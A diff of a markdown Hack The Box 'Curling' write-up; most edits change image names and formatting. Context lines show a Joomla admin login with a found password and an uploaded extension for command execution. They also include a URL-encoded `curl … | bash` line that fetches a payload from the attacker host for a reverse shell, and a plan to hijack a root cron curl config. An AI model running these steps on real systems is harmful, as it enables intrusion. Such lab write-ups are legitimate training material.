@@ -6,7 +6,7 @@
 
 **CTF**: [https://app.hackthebox.com/machines/Curling](https://app.hackthebox.com/machines/Curling)
 
----
+***
 
 Let’s start testing the connection with the target machine:
 
@@ -32,7 +32,7 @@ And we have an Apache 2.4.29 service running in the port 80. We can also see tha
 
 It doesn’t give us additional useful information. Let’s see how the website looks:
 
-<figure><img src="../../.gitbook/assets/curling5.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (19).png" alt=""><figcaption></figcaption></figure>
 
 It looks very simple. There are 3 post written by the user Super User. There is something in the first post that catches my eye, the word `curling2018`. It looks like a password maybe? The post is also signed by Floris, maybe that could be a username?It worth the try.
 
@@ -72,13 +72,13 @@ Ok, this credentials are not valid for the SSH connection.
 
 Let’s see if we can access to the administration panel of the Joomla:
 
-<figure><img src="../../.gitbook/assets/curling15.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (20).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/curling16.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (21).png" alt=""><figcaption></figcaption></figure>
 
 Yup! Let’s see if we can see the version:
 
-<figure><img src="../../.gitbook/assets/curling17.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (22).png" alt=""><figcaption></figcaption></figure>
 
 As we are inside the administration panel, maybe we can install a webshell or a reverse shell php file… Let’s investigate.
 
@@ -90,7 +90,7 @@ It contains a Joomla extension that we can upload to the website and it will giv
 
 So, let’s follow all the instructions! And try to execute a command!
 
-<figure><img src="../../.gitbook/assets/curling18.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (23).png" alt=""><figcaption></figcaption></figure>
 
 Yeah! We succesfully executed the `ls` command!
 
@@ -112,13 +112,13 @@ but URL encoded:
 
 `curl%2010.10.14.234%2Fpwn%20%7C%20bash`
 
-<figure><img src="../../.gitbook/assets/curling21.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (24).png" alt=""><figcaption></figcaption></figure>
 
 And we obtained a revshell.
 
 <figure><img src="../../.gitbook/assets/curling22.png" alt=""><figcaption></figcaption></figure>
 
-We have no permissions to read the user flag, but we can read the password_backup file:
+We have no permissions to read the user flag, but we can read the password\_backup file:
 
 <figure><img src="../../.gitbook/assets/curling23.png" alt=""><figcaption></figcaption></figure>
 
@@ -210,8 +210,8 @@ Let’s start with the first one.
 
 After looking to the pspy a while, we can recognize some scripts being executed:
 
-- `/bin/sh -c sleep 1; cat /root/default.txt > /home/floris/admin-area/input` : This script is waiting 1 second, and then, copying the content of the file **default.txt** inside the **input** file
-- `curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report` : This script is doing a **curl** to the url inside the **input** file and saving the response inside the file **report**
+* `/bin/sh -c sleep 1; cat /root/default.txt > /home/floris/admin-area/input` : This script is waiting 1 second, and then, copying the content of the file **default.txt** inside the **input** file
+* `curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report` : This script is doing a **curl** to the url inside the **input** file and saving the response inside the file **report**
 
 I’m thinking that, as the first script is waiting 1 second before executing the curl, maybe is executing after the curl script. This would mean that if we edit the input file, the curl may use our URL instead of the default one? Let’s try.
 
